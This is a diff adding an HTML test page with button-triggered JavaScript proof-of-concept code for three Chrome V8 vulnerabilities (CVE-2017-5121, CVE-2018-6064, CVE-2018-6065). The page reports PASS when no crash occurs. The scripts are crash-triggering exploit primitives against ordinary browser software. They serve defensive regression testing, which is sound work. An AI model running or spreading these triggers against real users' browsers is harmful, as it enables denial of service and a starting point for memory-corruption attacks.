@@ -1,0 +1,85 @@
+
+<html>
+
+<body>
+
+<p> Click this button for executing. Test case for CVE-2017-5121. Result is either a crash or type error in console. None indicates PASS </p>
+<button onclick="CVE20175121()">Click me for CVE-2017-5121</button>
+</br></br>
+<p> Click this image for executing. Test case for CVE-2018-6064. Result is a crash. Nocrash indicates PASS </p>
+<button onclick="CVE20186064()">Click me for CVE-2018-6064</button>
+</br></br>
+<p> Click this image for executing. Test case for CVE-2018-6065. Result is a crash. Nocrash indicates PASS </p>
+<button onclick="CVE20186065()">Click me for CVE-2018-6065</button>
+
+
+<script>
+function CVE20175121(){
+//CVE-2017-5121
+document.write("Testing CVE20175121");
+var f = function()
+	{
+		var o = { a: {}, b: { ba: { baa: 0, bab: [] }, bb: {}, bc: { bca: {bcaa: 0, bcab: 0, bcac: this} } } };
+		o.b.bc.bca.bcab = 0;
+		o.b.bb.bba = Array.prototype.slice.apply(o.b.ba.bab);
+	};
+	while(true) f(f);
+	
+	alert("CVE-2017-5121 - PASS");
+}
+
+</script>
+
+<script>
+//CVE-2018-6064
+function CVE20186064(){
+let arr = [];
+arr[1000] = 0x1234;
+
+arr.__defineGetter__(256, function () {
+    delete arr[256];
+
+    arr.unshift(1.1);
+    arr.length = 0;
+});
+
+//Object.entries(arr).toString();
+Object.entries(arr).toString();
+alert("CVE-2018-6064 PASS");
+}
+
+</script>
+
+<script>
+
+function CVE20186065() {
+//CVE-2018-6065
+const f = eval(`(function f(i) {
+	if (i == 0) {
+		class Derived extends Object {
+			constructor() {
+				super();
+				${"this.a=1;".repeat(0x3fffe-8)}
+			}
+		}
+
+		return Derived;
+	}
+
+	class DerivedN extends f(i-1) {
+		constructor() {
+			super();
+			${"this.a=1;".repeat(0x40000-8)}
+		}
+	}
+
+	return DerivedN;
+})`);
+
+let a = new (f(0x7ff))();
+alert("CVE-2018-6065 PASS" + a);
+}
+</script>
+
+</body>
+</html>
